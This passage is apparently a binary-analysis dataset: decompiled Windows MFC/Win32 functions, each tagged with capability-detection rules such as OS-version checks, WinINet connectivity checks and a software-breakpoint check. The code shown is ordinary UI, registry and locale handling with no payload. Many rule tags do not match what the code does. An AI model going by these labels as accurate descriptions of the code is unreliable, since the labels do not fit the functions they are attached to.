fcn.0042e8d1();\n        *(unaff_EBP + -4) = 0;\n        puVar5 = fcn.00442675();\n        *(unaff_EBP + -0x24) = puVar5;\n        if (*(unaff_EBP + -0x10) < 0) {\n            iVar6 = fcn.0041306a(puVar5, puVar5 + uVar7);\n            uVar7 = iVar6 - puVar5;\n        }\n        else if ((*(unaff_EBP + -0x20) != *(unaff_EBP + -0x28)) &&\n                (iVar6 = fcn.00442caf(*(unaff_EBP + 8), *(unaff_EBP + 0x10)),  iVar6 != 0)) {\n            if ((*(puVar5[uVar7] + 0x468721) & 4) != 0) {\n                uVar7 = uVar7 + 1;\n            }\n            uVar7 = uVar7 + *(unaff_EBP + -0x10);\n        }\n        uVar8 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*(unaff_EBP + 8));\n        uVar9 = *(unaff_EBP + -0x1c);\n        if ((uVar8 - 1) + uVar7 < uVar9) {\ncode_r0x00442e59:\n            puVar10 = puVar5 + uVar7;\n            uVar4 = _sym.imp.KERNEL32.dll_lstrcmpA;\n            if (*(unaff_EBP + 0x10) == 0) {\n                uVar4 = _sym.imp.KERNEL32.dll_lstrcmpiA;\n            }\n            bVar11 = *0x46703c == 0;\n            *(unaff_EBP + -0x1c) = uVar4;\n            if (bVar11) {\n                if (*(unaff_EBP + -0x10) < 0) {\n                    puVar5 = puVar10 + (1 - puVar5);\n                    *(unaff_EBP + 0xc) = puVar5;\n                }\n                else {\n                    puVar5 = puVar5 + uVar9 + (-uVar8 - puVar10) + 1;\n                    *(unaff_EBP + 0xc) = puVar5;\n                }\n                while (puVar5 != NULL) {\n                    uVar4 = *(unaff_EBP + 8);\n                    puVar3 = puVar10 + uVar8;\n                    *(unaff_EBP + 0x13) = *puVar3;\n                    *puVar3 = 0;\n                    iVar6 = (**(unaff_EBP + -0x1c))(puVar10, uVar4);\n                    uVar2 = *(unaff_EBP + 0x13);\n                    *puVar3 = uVar2;\n                    if (iVar6 == 0) {\n                        fcn.004426ef();\n                        iVar6 = puVar10 - *(unaff_EBP + -0x24);\n                        goto code_r0x00442f87;\n                    }\n                    *(unaff_EBP + 0xc) = *(unaff_EBP + 0xc) + -1;\n                    puVar10 = puVar10 + *(unaff_EBP + -0x10);\n                    puVar5 = *(unaff_EBP + 0xc);\n                    *puVar3 = uVar2;\n                }\n                goto code_r0x00442f49;\n            }\n            if (*(unaff_EBP + -0x10) < 1) {\n                *(unaff_EBP + -0x18) = puVar10;\n            }\n            else {\n                *(unaff_EBP + -0x18) = puVar5 + uVar9 + (1 - uVar8);\n                puVar5 = puVar10;\n            }\n            puVar10 = NULL;\n            for (; puVar5 < *(unaff_EBP + -0x18) || puVar5 == *(unaff_EBP + -0x18); puVar5 = fcn.00412f81(puVar5)) {\n                puVar3 = *(unaff_EBP + 8);\n                if ((*(unaff_EBP + 0x10) == 0) ||\n                   ((*puVar5 == *puVar3 && (((*(*puVar5 + 0x468721) & 4) == 0 || (puVar5[1] == puVar3[1])))))) {\n                    *(unaff_EBP + 0xf) = puVar5[uVar8];\n                    puVar5[uVar8] = 0;\n                    iVar6 = (**(unaff_EBP + -0x1c))(puVar5, puVar3);\n                    puVar5[uVar8] = *(unaff_EBP + 0xf);\n                    if ((iVar6 == 0) && (puVar10 = puVar5,  0 < *(unaff_EBP + -0x10))) break;\n                }\n            }\n            fcn.004426ef();\n            if (puVar10 != NULL) {\n                iVar6 = puVar10 - *(unaff_EBP + -0x24);\ncode_r0x00442f87:\n                fcn.00410220(iVar6, iVar6 + uVar8, 0);\n                *(unaff_EBP + -4) = 0xffffffff;\n                fcn.00444bf8();\n                fcn.0042e8e6();\n                uVar4 = 1;\n                goto code_r0x00442f64;\n            }\n        }\n        else {\n            if ((*(unaff_EBP + -0x10) < 0) && (uVar8 <= uVar9)) {\n                if (*0x46703c == 0) {\n                    uVar7 = uVar9 - uVar8;\n                }\n                else {\n                    uVar7 = uVar9;\n                    if (uVar8 != 0) {\n                        *(unaff_EBP + 0xc) = uVar8;\n                        do {\n                            iVar6 = fcn.0041306a(puVar5, puVar5 + uVar7);\n                            uVar7 = iVar6 - puVar5;\n                            piVar1 = unaff_EBP + 0xc;\n                            *piVar1 = *piVar1 + -1;\n                        } while (*piVar1 != 0);\n                        uVar9 = *(unaff_EBP + -0x1c);\n                    }\n                }\n                goto code_r0x00442e59;\n            }\ncode_r0x00442f49:\n            fcn.004426ef();\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.00444bf8();\n        fcn.0042e8e6();\n    }\n    uVar4 = 0;\ncode_r0x00442f64:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar4;\n}\n",
        "token_count": 1960
    },
    "00443675": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00443675(int32_t arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    uint var_4h;\n    \n    if ((((*(arg_8h + 0x84) == 0) || (iVar1 = *(arg_8h + 0x88),  iVar1 == 0)) || (*(iVar1 + 0x90) == 0)) ||\n       ((iVar2 = fcn.0043de11(),  iVar2 != 1 || ((*(iVar1 + 0x7c) & arg_14h & 0xf000) == 0)))) {\n        uVar5 = arg_14h;\n        if (((*(arg_8h + 0x7c) & 4) != 0) && (uVar5 = arg_14h | 4,  (arg_14h & 0x5000) != 0)) {\n            uVar5 = arg_14h & 0xffff2fff | 0x2004;\n        }\n        arg_14h = uVar5;\n        piVar4 = fcn.004434a5(arg_14h);\n        fcn.0042e037(0, arg_ch, arg_10h, 0, 0, 0x15);\n        if (piVar4[0xd] == 0) {\n            piVar4[0xd] = *(arg_8h + 0x1c);\n        }\n        fcn.0042dbaf(0xe81f);\n        fcn.0043e54f(arg_8h, 0);\n        (**(*piVar4 + 0x144))(1);\n        uVar5 = (*_sym.imp.USER32.dll_GetWindowLongA)(*(arg_8h + 0x1c), 0xfffffff0);\n        if ((uVar5 & 0x10000000) == 0) {\n            return;\n        }\n        fcn.0042de3e(8);\n    }\n    else {\n        uVar3 = (*_sym.imp.USER32.dll_GetParent)(*(iVar1 + 0x1c));\n        piVar4 = fcn.0042b432(uVar3);\n        fcn.0042e037(0, arg_ch, arg_10h, 0, 0, 0x15);\n        (**(*piVar4 + 0x144))(1);\n    }\n    (*_sym.imp.USER32.dll_UpdateWindow)(piVar4[7]);\n    return;\n}\n",
        "token_count": 598
    },
    "0044377f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl\nfcn.0044377f(uint lprcSrc2, uint noname_1, uint noname_2, uint noname_3, uint32_t arg_18h, int32_t **arg_1ch)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    int32_t **ppiVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    int32_t lprcSrc1;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    ppiVar2 = arg_1ch;\n    arg_18h = arg_18h & 0xf040;\n    if (arg_1ch != NULL) {\n        *arg_1ch = NULL;\n    }\n    arg_1ch = *(in_ECX + 0x84);\n    do {\n        do {\n            if (arg_1ch == NULL) {\n                return 0;\n            }\n            ppiVar3 = fcn.0040ab3a(&arg_1ch);\n            piVar1 = *ppiVar3;\n            iVar4 = (**(*piVar1 + 0x158))();\n        } while ((((iVar4 == 0) || (iVar4 = (*_sym.imp.USER32.dll_IsWindowVisible)(piVar1[7]),  iVar4 == 0)) ||\n                 ((piVar1[0x1f] & arg_18h & 0xf000) == 0)) ||\n                ((piVar1[0x24] != 0 && ((piVar1[0x1f] & arg_18h & 0x40) == 0))));\n        (*_sym.imp.USER32.dll_GetWindowRect)(piVar1[7], &lprcSrc1);\n        if (var_8h == lprcSrc1) {\n            var_8h = var_8h + 1;\n        }\n        if (var_4h == var_ch) {\n            var_4h = var_4h + 1;\n        }\n        iVar4 = (*_sym.imp.USER32.dll_IntersectRect)(&lprcSrc1, &lprcSrc1, &lprcSrc2);\n    } while (iVar4 == 0);\n    if (ppiVar2 != NULL) {\n        *ppiVar2 = piVar1;\n    }\n    return piVar1[0x1f] & arg_18h;\n}\n",
        "token_count": 545
    },
    "00443a1b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00443a1b(uint noname_0, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t in_ECX;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = fcn.0042dd19();\n    (*_sym.imp.USER32.dll_GetWindowRect)(*(in_ECX + 0x1c), &var_14h);\n    pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n    iVar3 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x21);\n    iVar4 = (*pcVar1)(0x20);\n    uVar5 = fcn.0042b38f();\n    if ((var_4h & 0x1000) != 0) {\n        if (uVar5 == 3) {\n            uVar5 = 2;\n        }\n        iVar2 = (*_sym.imp.USER32.dll_GetKeyState)(2);\n        if (iVar2 < 0) {\n            return 0;\n        }\n    }\n    if (((9 < uVar5) && (uVar5 < 0x12)) || (uVar5 == 4)) {\n        if ((var_4h & 0x800) == 0) {\n            (*_sym.imp.USER32.dll_InflateRect)(&var_14h, -iVar4, -iVar3);\n            if ((var_4h & 0x200) != 0) {\n                if (uVar5 != 4) {\n                    if (uVar5 == 0xd) {\n                        return (arg_ch < var_10h) * 2 + 10;\n                    }\n                    if (uVar5 == 0xe) {\n                        return (arg_ch < var_10h) + 0xb;\n                    }\n                    if (uVar5 == 0x10) {\n                        return ((arg_ch <= var_8h) - 1 & 5) + 10;\n                    }\n                    if (uVar5 != 0x11) {\n                        return uVar5;\n                    }\n                }\n                uVar5 = (var_8h < arg_ch) * 4 + 0xb;\n            }\n        }\n        else {\n            uVar5 = 2;\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 559
    },
    "0044461d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044461d(code **param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    *param_1 = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.2.0;\n    param_1[1] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.1.0;\n    param_1[4] = vtable.CMFCComObject_class_ATL::CAccessibleProxy_.0;\n    param_1[5] = 0xc0000001;\n    fcn.0040b7ef();\n    iVar2 = fcn.00444bf8();\n    iVar2 = (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(iVar2 + 0x2c);\n    if (iVar2 != 0) {\n        return;\n    }\n    iVar2 = fcn.00444bf8();\n    if (*(iVar2 + 0x30) == 0) {\n        fcn.0043f681(1);\n        iVar2 = fcn.00444bf8();\n        iVar2 = *(iVar2 + 4);\n        if ((iVar2 == 0) || (*(iVar2 + 0x1c) == 0)) {\n            iVar2 = fcn.00444bf8();\n            if (*(iVar2 + 0x14) == '\\0') {\n                fcn.0044aa55(0);\n            }\n        }\n        else {\n            iVar1 = fcn.0042de5f();\n            if (iVar1 != 0) {\n    // WARNING: Could not recover jumptable at 0x0043f6ce. Too many branches\n    // WARNING: Treating indirect jump as call\n                (**(**(iVar2 + 0x1c) + 0x60))();\n                return;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 415
    },
    "0044495a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044495a(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_ECX + 0xc);\n    while (iVar1 != 0) {\n        fcn.00427ea0();\n        if (var_8h != arg_8h) {\n            fcn.0042eae6(var_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 125
    },
    "0044499c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044499c(code **param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    \n    *param_1 = vtable.AFX_MODULE_THREAD_STATE.0;\n    if (param_1[0xf] != NULL) {\n        (**(*param_1[0xf] + 0x138))();\n    }\n    if (param_1[5] != NULL) {\n        (***param_1[5])(1);\n    }\n    if (param_1[6] != NULL) {\n        (***param_1[6])(1);\n    }\n    if (param_1[7] != NULL) {\n        (***param_1[7])(1);\n    }\n    if (param_1[8] != NULL) {\n        (***param_1[8])(1);\n    }\n    if (param_1[9] != NULL) {\n        (***param_1[9])(1);\n    }\n    pcVar2 = param_1[0xe];\n    if (pcVar2 != NULL) {\n        while (*(pcVar2 + 0xc) != 0) {\n            uVar1 = fcn.00426f76();\n            fcn.0042eae6(uVar1);\n            pcVar2 = param_1[0xe];\n        }\n    }\n    if (param_1[0xc] != NULL) {\n        (**(*param_1[0xc] + 4))(1);\n    }\n    if (param_1[0xd] != NULL) {\n        (**(*param_1[0xd] + 4))(1);\n    }\n    if (param_1[0xe] != NULL) {\n        (**(*param_1[0xe] + 4))(1);\n    }\n    return;\n}\n",
        "token_count": 391
    },
    "00444cfc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00444cfc(uint arg_8h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint32_t var_28h;\n    int32_t lpType;\n    uint lpcbData;\n    uint32_t hKey;\n    uint32_t lParam;\n    uint lpData;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.KERNEL32.dll_GetModuleHandleA;\n    var_4h = *0x4640c8;\n    lParam = 0;\n    iVar5 = 0;\n    lpcbData = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"kernel32.dll\");\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(lpcbData, \"GetUserDefaultUILanguage\");\n    if (pcVar2 == NULL) {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n        if (iVar6 < 0) {\n            hKey = 0;\n            iVar6 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)\n                              (0x80000001, \"Control Panel\\\\Desktop\\\\ResourceLocale\", 0, 0x20019, &hKey);\n            if (iVar6 == 0) {\n                lpcbData = 0x10;\n                iVar6 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, 0, 0, &lpType, &lpData, &lpcbData);\n                if (((iVar6 == 0) && (lpType == 1)) &&\n                   (iVar6 = fcn.00410ebd(&lpData, 0x451650, &var_28h), \n                   pcVar1 = _sym.imp.KERNEL32.dll_ConvertDefaultLocale,  iVar6 == 1)) {\n                    lParam = var_28h;\n                    var_3ch = (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)(var_28h & 0xffff);\n                    var_38h = (*pcVar1)(var_28h & 0x3ff);\n                    iVar5 = 2;\n                }\n                (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            }\n        }\n        else {\n            iVar6 = (*pcVar1)(\"ntdll.dll\");\n            if (iVar6 != 0) {\n                lParam = 0;\n                (*_sym.imp.KERNEL32.dll_EnumResourceLanguagesA)(iVar6, 0x10, 1, 0x444ce6, &lParam);\n                pcVar1 = _sym.imp.KERNEL32.dll_ConvertDefaultLocale;\n                if (lParam != 0) {\n                    uVar4 = lParam & 0x3ff;\n                    var_3ch = (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)(lParam & 0xffff);\n                    var_38h = (*pcVar1)(uVar4);\n                    iVar5 = 2;\n                }\n            }\n        }\n    }\n    else {\n        lParam = (*pcVar2)();\n        pcVar1 = _sym.imp.KERNEL32.dll_ConvertDefaultLocale;\n        hKey = lParam & 0x3ff;\n        var_3ch = (*_sym.imp.KERNEL32.dll_ConvertDefaultLocale)(lParam & 0xffff);\n        var_38h = (*pcVar1)(hKey);\n        pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(lpcbData, \"GetSystemDefaultUILanguage\");\n        lParam = (*pcVar2)();\n        uVar4 = lParam & 0x3ff;\n        var_34h = (*pcVar1)(lParam & 0xffff);\n        var_30h = (*pcVar1)(uVar4);\n        iVar5 = 4;\n    }\n    (&var_3ch)[iVar5] = 0x800;\n    iVar6 = 0;\n    if (iVar5 != -1) {\n        do {\n            iVar3 = fcn.00444c67(arg_8h, (&var_3ch)[iVar6]);\n            if (iVar3 != 0) break;\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < iVar5 + 1);\n    }\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 997
    },
    "00445376": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00445376(int32_t param_1)\n\n{\n    if (*(param_1 + 0x84) != NULL) {\n        (**(**(param_1 + 0x84) + 0x14))();\n    }\n    if (*(param_1 + 0x90) != 0) {\n        fcn.004390e9(\"Settings\", \"PreviewPages\", *(param_1 + 0x90));\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "00445601": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00445601(int32_t param_1, char *param_2)\n\n{\n    char cVar1;\n    char *pcVar2;\n    \n    if ((*(*(param_1 + 0x14) + -0xc) != 0) &&\n       ((*(param_1 + 0x10) != 3 ||\n        (((*(*(param_1 + 0x18) + -0xc) != 0 && (*(*(param_1 + 0x1c) + -0xc) != 0)) && (*(*(param_1 + 0x20) + -0xc) != 0)\n         ))))) {\n        return;\n    }\n    if (param_2 == NULL) {\n        fcn.00401b10(0, 0);\n        return;\n    }\n    pcVar2 = param_2;\n    do {\n        cVar1 = *pcVar2;\n        pcVar2 = pcVar2 + 1;\n    } while (cVar1 != '\\0');\n    fcn.00401b10(param_2, pcVar2 - (param_2 + 1));\n    return;\n}\n",
        "token_count": 253
    },
    "00445ff0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00445ff0(int32_t param_1)\n\n{\n    if (param_1 != 0) {\n    // WARNING: Could not recover jumptable at 0x00445ff7. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.KERNEL32.dll_LocalFree)();\n        return;\n    }\n    return;\n}\n",
        "token_count": 83
    },
    "00446208": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00446208(int32_t *param_1)\n\n{\n    uint var_4h;\n    \n    if (*param_1 != 0) {\n        if (*param_1 != NULL) {\n            (****param_1)(1);\n        }\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "00446492": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00446492(uint *arg_8h, int32_t arg_ch)\n\n{\n    uint *puVar1;\n    bool bVar2;\n    uint *in_ECX;\n    int32_t iVar3;\n    uint var_4h;\n    \n    iVar3 = 1;\n    bVar2 = true;\n    if (1 < arg_8h[2]) {\n        do {\n            if ((arg_ch == 0) || (*(in_ECX[4] + 4 + iVar3 * 8) == arg_ch)) {\n                puVar1 = *(arg_8h[3] + iVar3 * 4);\n                if (puVar1 != NULL) {\n                    (***puVar1)(1);\n                }\n                *(arg_8h[3] + iVar3 * 4) = 0;\n            }\n            else if (*(arg_8h[3] + iVar3 * 4) != 0) {\n                bVar2 = false;\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_8h[2]);\n        if (!bVar2) {\n            return;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(in_ECX + 7);\n    fcn.00446259(arg_8h);\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(in_ECX + 7);\n    (*_sym.imp.KERNEL32.dll_LocalFree)(arg_8h[3]);\n    (***arg_8h)(1);\n    (*_sym.imp.KERNEL32.dll_TlsSetValue)(*in_ECX, 0);\n    return;\n}\n",
        "token_count": 359
    },
    "00446527": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00446527(uint *param_1, int32_t param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint unaff_retaddr;\n    \n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(param_1 + 7);\n    if (param_2 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*param_1);\n        if (iVar2 != 0) {\n            fcn.00446492(iVar2, unaff_retaddr);\n        }\n    }\n    else {\n        iVar2 = param_1[5];\n        while (iVar2 != 0) {\n            iVar1 = *(iVar2 + 4);\n            fcn.00446492(iVar2, param_3);\n            iVar2 = iVar1;\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(param_1 + 7);\n    return;\n}\n",
        "token_count": 216
    },
    "00446580": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.00446580(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    if (*extraout_ECX == 0) {\n        if (*0x466e04 == 0) {\n            *(unaff_EBP + -0x10) = 0x466e08;\n            *(unaff_EBP + -4) = 0;\n            *0x466e04 = fcn.004462ca();\n            *(unaff_EBP + -4) = 0xffffffff;\n        }\n        iVar1 = fcn.00446000();\n        *extraout_ECX = iVar1;\n    }\n    iVar1 = fcn.0044610c(*extraout_ECX);\n    if (iVar1 == 0) {\n        iVar1 = (**(unaff_EBP + 8))();\n        fcn.0044636f(*extraout_ECX, iVar1);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar1;\n}\n",
        "token_count": 324
    },
    "004466d1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t fcn.004466d1(void)\n\n{\n    if (*0x467038 == 0) {\n        *0x467038 = 1;\n        (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(0x466e84);\n    }\n    return *0x467038;\n}\n",
        "token_count": 66
    },
    "0044673a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0044673a(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    \n    if (*0x467038 == 0) {\n        fcn.004466d1();\n    }\n    pcVar2 = _sym.imp.KERNEL32.dll_EnterCriticalSection;\n    piVar1 = param_1 * 4 + 0x466e40;\n    if (*piVar1 == 0) {\n        (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(0x466e84);\n        if (*piVar1 == 0) {\n            (*_sym.imp.KERNEL32.dll_InitializeCriticalSection)(param_1 * 0x18 + 0x466ea0);\n            *piVar1 = *piVar1 + 1;\n        }\n        (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(0x466e84);\n    }\n    (*pcVar2)(param_1 * 0x18 + 0x466ea0);\n    return;\n}\n",
        "token_count": 223
    },
    "0044694a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0044694a(uint lpAppName, uint lpValueName, int32_t nDefault)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_8h;\n    int32_t var_4h;\n    \n    if (*(in_ECX + 0x50) == 0) {\n        nDefault = (*_sym.imp.KERNEL32.dll_GetPrivateProfileIntA)(lpAppName, lpValueName, nDefault, *(in_ECX + 100));\n    }\n    else {\n        var_4h = in_ECX;\n        iVar1 = fcn.00446904(lpAppName);\n        if (iVar1 != 0) {\n            lpAppName = 4;\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(iVar1, lpValueName, 0, &var_8h, &var_4h, &lpAppName);\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar1);\n            if (iVar2 == 0) {\n                return var_4h;\n            }\n        }\n    }\n    return nDefault;\n}\n",
        "token_count": 257
    },
    "00446c2a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00446c2a(uint phkResult, uint lpString, int32_t lpValueName)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    bool bVar4;\n    \n    if (lpValueName == 0) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegSetValueA)(0x80000000, phkResult, 1, lpString, uVar1);\n        bVar4 = iVar2 == 0;\n    }\n    else {\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyA)(0x80000000, phkResult, &phkResult);\n        if (iVar2 == 0) {\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n            iVar2 = (*_sym.imp.ADVAPI32.dll_RegSetValueExA)(phkResult, lpValueName, 0, 1, lpString, iVar2 + 1);\n            iVar3 = (*_sym.imp.ADVAPI32.dll_RegCloseKey)(phkResult);\n            if ((iVar3 == 0) && (iVar2 == 0)) {\n                return true;\n            }\n        }\n        bVar4 = false;\n    }\n    return bVar4;\n}\n",
        "token_count": 306
    },
    "00446f78": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
